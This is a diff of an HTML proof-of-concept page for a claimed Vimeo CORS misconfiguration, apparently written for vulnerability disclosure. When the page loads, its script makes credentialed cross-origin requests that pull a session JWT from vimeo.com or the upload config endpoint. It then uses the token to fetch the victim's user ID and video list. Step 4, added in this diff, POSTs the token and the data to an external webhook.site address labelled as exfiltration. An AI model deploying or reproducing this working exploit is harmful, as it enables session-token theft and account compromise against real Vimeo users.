@@ -1,56 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Vimeo CORS Misconfiguration PoC</title>
+  <title>Vimeo CORS Misconfiguration PoC (Parallel)</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration PoC</h1>
-  <pre id="output">Loading...</pre>
+  <h1>Vimeo CORS Misconfiguration PoC (Parallel)</h1>
+  <pre id="output"></pre>
 
   <script>
-    async function runPoC() {
+    (async () => {
       const output = document.getElementById("output");
+      const webhook = "https://webhook.site/your-id"; // Replace with your actual webhook
+
+      function log(msg) {
+        console.log(msg);
+        output.textContent += msg + "\n";
+      }
+
+      async function getJwtFromHomepage() {
+        log("[*] Trying homepage JWT...");
+        let homeResp = await fetch("https://vimeo.com", { credentials: "include" });
+        let homeText = await homeResp.text();
+        let jwtMatch = homeText.match(/"jwt":"(eyJ[^"]+)"/);
+        if (jwtMatch) {
+          return { jwt: jwtMatch[1] };
+        }
+        throw new Error("No JWT in homepage");
+      }
+
+      async function getJwtFromConfig() {
+        log("[*] Trying /upload/config JWT...");
+        let configResp = await fetch("https://api.vimeo.com/upload/config", { credentials: "include" });
+        let configJson = await configResp.json();
+        if (configJson?.api?.jwt) {
+          return {
+            jwt: configJson.api.jwt,
+            userId: configJson.user?.id || null
+          };
+        }
+        throw new Error("No JWT in config");
+      }
 
       try {
-        // Step 1: Fetch Vimeo homepage with cookies
-        output.textContent = "[*] Fetching Vimeo homepage…";
-        const homepage = await fetch("https://vimeo.com/", { credentials: "include" });
-        const html = await homepage.text();
+        // === Step 1: Run both sources in parallel ===
+        const jwtData = await Promise.any([
+          getJwtFromHomepage(),
+          getJwtFromConfig()
+        ]);
 
-        // Step 2: Extract JWT embedded in the page
-        const jwtMatch = html.match(/"jwt"\s*:\s*"([^"]+)"/);
-        if (!jwtMatch) {
-          output.textContent = "[!] Could not find JWT in homepage source";
-          return;
+        const jwtToken = jwtData.jwt;
+        let userId = jwtData.userId || null;
+
+        log("[+] Got JWT: " + jwtToken.substring(0, 30) + "...");
+
+        // === Step 2: Resolve user ID if needed ===
+        if (!userId) {
+          log("[*] Resolving user ID via /me...");
+          const meResp = await fetch("https://api.vimeo.com/me", {
+            headers: { Authorization: "jwt " + jwtToken }
+          });
+          const meJson = await meResp.json();
+          userId = meJson.id;
+          log("[+] User ID: " + userId);
         }
-        const jwt = jwtMatch[1];
-        output.textContent = "[+] Extracted JWT:\n" + jwt + "\n\n";
 
-        // Step 3: Call /users/me with the stolen JWT
-        output.textContent += "[*] Fetching /users/me with JWT…\n";
-        const meResp = await fetch("https://api.vimeo.com/users/me", {
-          headers: { "Authorization": "jwt " + jwt }
+        // === Step 3: Get videos ===
+        const vidsUrl = `https://api.vimeo.com/users/${userId}/videos?per_page=10&page=1&fields=name,link,duration,privacy.view`;
+        log("[*] Fetching videos...");
+        const vidsResp = await fetch(vidsUrl, {
+          headers: { Authorization: "jwt " + jwtToken }
         });
-        const meData = await meResp.json();
+        const vidsJson = await vidsResp.json();
+        log("[+] Got videos: " + JSON.stringify(vidsJson, null, 2));
 
-        output.textContent += "[+] Account data:\n" + JSON.stringify(meData, null, 2) + "\n\n";
-
-        // Step 4: (Optional) call /upload/config for completeness
-        output.textContent += "[*] Fetching /upload/config with JWT…\n";
-        const configResp = await fetch("https://api.vimeo.com/upload/config", {
-          headers: { "Authorization": "jwt " + jwt }
+        // === Step 4: Exfiltrate to webhook ===
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            jwt: jwtToken,
+            userId,
+            videos: vidsJson
+          })
         });
-        const configData = await configResp.json();
-
-        output.textContent += "[+] Upload config:\n" + JSON.stringify(configData, null, 2);
-
+        log("[*] Data exfiltrated to webhook.");
       } catch (err) {
-        output.textContent = "[!] Error: " + err;
+        log("[!] Error: " + err);
       }
-    }
-
-    runPoC();
+    })();
   </script>
 </body>
 </html>
